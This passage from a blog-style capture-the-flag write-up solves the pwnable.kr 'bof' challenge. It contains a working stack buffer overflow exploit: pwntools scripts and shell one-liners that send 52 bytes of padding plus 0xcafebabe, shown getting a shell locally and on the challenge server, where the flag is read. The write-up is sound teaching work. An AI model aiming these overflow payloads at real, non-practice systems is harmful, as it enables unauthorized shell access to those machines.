+&gt;&gt;&gt; hex(0xffffd7e0-0xffffd7ac)
+'0x34'
+&gt;&gt;&gt; print(0x34)
+52
+</code></pre>
+
+<p>So <code class="language-plaintext highlighter-rouge">0xdeadbeef</code> comes after 52 bytes of buffer</p>
+
+<p>If we can overwrite <code class="language-plaintext highlighter-rouge">0xdeadbeef</code> with <code class="language-plaintext highlighter-rouge">0xcafebabe</code>, a shell will be opened</p>
+
+<hr />
+
+<p>Now, lets try to exploit the program locally using <code class="language-plaintext highlighter-rouge">pwntools</code></p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ra</span><span class="err">@</span><span class="n">moni</span><span class="o">~/</span><span class="n">P</span><span class="o">/</span><span class="n">p</span><span class="o">/</span><span class="n">bof</span><span class="o">&gt;</span> <span class="n">cat</span> <span class="n">exploit</span><span class="p">.</span><span class="n">py</span>
+<span class="cp">#!/usr/bin/python
+</span><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
+<span class="n">buf</span><span class="o">=</span><span class="s">""</span>
+<span class="n">buf</span><span class="o">+=</span><span class="s">"A"</span><span class="o">*</span><span class="mi">52</span>
+<span class="n">buf</span><span class="o">+=</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xcafebabe</span><span class="p">)</span>
+<span class="n">host</span><span class="o">=</span><span class="s">"128.61.240.205"</span>
+<span class="n">port</span><span class="o">=</span><span class="mi">9000</span>
+<span class="cp">#p=remote(host,port)
+</span><span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="err">'</span><span class="p">.</span><span class="o">/</span><span class="n">bof</span><span class="err">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>By running this exploit</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ra</span><span class="err">@</span><span class="n">moni</span><span class="o">~/</span><span class="n">P</span><span class="o">/</span><span class="n">p</span><span class="o">/</span><span class="n">bof</span><span class="o">&gt;</span> <span class="n">python</span> <span class="n">exploit</span><span class="p">.</span><span class="n">py</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">local</span> <span class="n">process</span> <span class="err">'</span><span class="p">.</span><span class="o">/</span><span class="n">bof</span><span class="err">'</span><span class="o">:</span> <span class="n">pid</span> <span class="mi">36634</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
+
+<span class="err">$</span>
+<span class="err">$</span> <span class="n">whoami</span>
+<span class="n">ra</span>
+<span class="err">$</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Interrupted</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Stopped</span> <span class="n">process</span> <span class="err">'</span><span class="p">.</span><span class="o">/</span><span class="n">bof</span><span class="err">'</span> <span class="p">(</span><span class="n">pid</span> <span class="mi">36634</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Other way to exploit by piping,</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ra</span><span class="err">@</span><span class="n">moni</span><span class="o">:~/</span><span class="n">PWNPractice</span><span class="o">/</span><span class="n">pwnable</span><span class="p">.</span><span class="n">kr</span><span class="o">/</span><span class="n">bof</span><span class="err">$</span> <span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">"print('A'*52+'</span><span class="se">\xbe\xba\xfe\xca</span><span class="s">')"</span><span class="p">;</span><span class="n">cat</span><span class="p">)</span> <span class="o">|</span> <span class="p">.</span><span class="o">/</span><span class="n">bof</span>
+<span class="n">overflow</span> <span class="n">me</span> <span class="o">:</span>
+<span class="n">whoami</span>
+<span class="n">ra</span>
+<span class="n">ls</span>
+<span class="n">bof</span>  <span class="n">bof</span><span class="p">.</span><span class="n">c</span>  <span class="n">bof</span><span class="p">.</span><span class="n">md</span>  <span class="n">exploit</span><span class="p">.</span><span class="n">py</span>
+<span class="n">echo</span> <span class="s">"OVERFLOW"</span>
+<span class="n">OVERFLOW</span>
+</code></pre></div></div>
+<hr />
+
+<p>Now lets try to exploit this on server,</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ra</span><span class="err">@</span><span class="n">moni</span><span class="o">:~/</span><span class="n">PWNPractice</span><span class="o">/</span><span class="n">pwnable</span><span class="p">.</span><span class="n">kr</span><span class="o">/</span><span class="n">bof</span><span class="err">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">"print('A'*52+'</span><span class="se">\xbe\xba\xfe\xca</span><span class="s">')"</span> <span class="o">&gt;</span> <span class="n">exploitdata</span>
+<span class="n">ra</span><span class="err">@</span><span class="n">moni</span><span class="o">:~/</span><span class="n">PWNPractice</span><span class="o">/</span><span class="n">pwnable</span><span class="p">.</span><span class="n">kr</span><span class="o">/</span><span class="n">bof</span><span class="err">$</span> <span class="n">cat</span> <span class="n">exploitdata</span>
+<span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span class="err">�</span>
+                                                     <span class="n">ra</span><span class="err">@</span><span class="n">moni</span><span class="o">:~/</span><span class="n">PWNPractice</span><span class="o">/</span><span class="n">pwnable</span><span class="p">.</span><span class="n">kr</span><span class="o">/</span><span class="n">bof</span><span class="err">$</span> <span class="o">^</span><span class="n">C</span>
+<span class="n">ra</span><span class="err">@</span><span class="n">moni</span><span class="o">:~/</span><span class="n">PWNPractice</span><span class="o">/</span><span class="n">pwnable</span><span class="p">.</span><span class="n">kr</span><span class="o">/</span><span class="n">bof</span><span class="err">$</span> <span class="p">(</span><span class="n">cat</span> <span class="n">exploitdata</span> <span class="p">;</span><span class="n">cat</span><span class="p">)</span> <span class="o">|</span> <span class="p">.</span><span class="o">/</span><span class="n">bof</span>
+<span class="n">overflow</span> <span class="n">me</span> <span class="o">:</span>
+<span class="n">ls</span>
+<span class="n">bof</span>  <span class="n">bof</span><span class="p">.</span><span class="n">c</span>  <span class="n">bof</span><span class="p">.</span><span class="n">md</span>  <span class="n">exploitdata</span>  <span class="n">exploit</span><span class="p">.</span><span class="n">py</span>
+<span class="o">^</span><span class="n">C</span><span class="o">***</span> <span class="n">stack</span> <span class="n">smashing</span> <span class="n">detected</span> <span class="o">***:</span> <span class="n">terminated</span>
+<span class="n">Aborted</span> <span class="p">(</span><span class="n">core</span> <span class="n">dumped</span><span class="p">)</span>
+
+<span class="n">ra</span><span class="err">@</span><span class="n">moni</span><span class="o">:~/</span><span class="n">PWNPractice</span><span class="o">/</span><span class="n">pwnable</span><span class="p">.</span><span class="n">kr</span><span class="o">/</span><span class="n">bof</span><span class="err">$</span>
+</code></pre></div></div>
+<p>Now lets try it,</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ra</span><span class="err">@</span><span class="n">moni</span><span class="o">:~/</span><span class="n">PWNPractice</span><span class="o">/</span><span class="n">pwnable</span><span class="p">.</span><span class="n">kr</span><span class="o">/</span><span class="n">bof</span><span class="err">$</span> <span class="p">(</span><span class="n">cat</span> <span class="n">exploitdata</span> <span class="p">;</span><span class="n">cat</span><span class="p">)</span><span class="o">|</span> <span class="n">nc</span> <span class="mi">128</span><span class="p">.</span><span class="mi">61</span><span class="p">.</span><span class="mi">240</span><span class="p">.</span><span class="mi">205</span> <span class="mi">9000</span>
+<span class="n">overflow</span> <span class="n">me</span> <span class="o">:</span>
+<span class="n">whoami</span>
+<span class="n">bof</span>
+<span class="n">cat</span> <span class="n">flag</span>
+<span class="n">daddy</span><span class="p">,</span> <span class="n">I</span> <span class="n">just</span> <span class="n">pwned</span> <span class="n">a</span> <span class="n">buFFer</span> <span class="o">:</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Lets do with <code class="language-plaintext highlighter-rouge">pwntools</code></p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ra</span><span class="err">@</span><span class="n">moni</span><span class="o">~/</span><span class="n">P</span><span class="o">/</span><span class="n">p</span><span class="o">/</span><span class="n">bof</span><span class="o">&gt;</span> <span class="n">cat</span> <span class="n">exploit</span><span class="p">.</span><span class="n">py</span>
+<span class="cp">#!/usr/bin/python
+</span><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
+<span class="n">buf</span><span class="o">=</span><span class="s">""</span>
+<span class="n">buf</span><span class="o">+=</span><span class="s">"A"</span><span class="o">*</span><span class="mi">52</span>
+<span class="n">buf</span><span class="o">+=</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xcafebabe</span><span class="p">)</span>
+<span class="n">host</span><span class="o">=</span><span class="s">"128.61.240.205"</span>
+<span class="n">port</span><span class="o">=</span><span class="mi">9000</span>
+<span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
+<span class="cp">#p=process('./bof')
+</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Trying it,</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ra</span><span class="err">@</span><span class="n">moni</span><span class="o">~/</span><span class="n">P</span><span class="o">/</span><span class="n">p</span><span class="o">/</span><span class="n">bof</span><span class="o">&gt;</span> <span class="n">python3</span> <span class="n">test</span><span class="p">.</span><span class="n">py</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">connection</span> <span class="n">to</span> <span class="mi">128</span><span class="p">.</span><span class="mi">61</span><span class="p">.</span><span class="mi">240</span><span class="p">.</span><span class="mi">205</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">9000</span><span class="o">:</span> <span class="n">Done</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
+<span class="err">$</span> <span class="n">whoami</span>
+<span class="err">$</span> <span class="n">whoami</span>
+<span class="n">bof</span>
+<span class="err">$</span> <span class="n">cat</span> <span class="n">flag</span>
+<span class="n">daddy</span><span class="p">,</span> <span class="n">I</span> <span class="n">just</span> <span class="n">pwned</span> <span class="n">a</span> <span class="n">buFFer</span> <span class="o">:</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Done! we got the flag</p>
+
+<p><code class="language-plaintext highlighter-rouge">Flag: daddy, I just pwned a buFFer :)</code></p>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#buffer-overflow" class="page__taxonomy-item" rel="tag">buffer overflow</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#pwn" class="page__taxonomy-item" rel="tag">Pwn</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2021-06-03T00:00:00+05:30">June 3, 2021</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/pwn/2-collision/" class="pagination--pager" title="pwnable.kr - collision
+">Previous</a>
+    
+    
+      <a href="/pwn/1-flag/" class="pagination--pager" title="pwnable.kr - flag
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2021 Monish Kumar. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+  </body>
+</html>
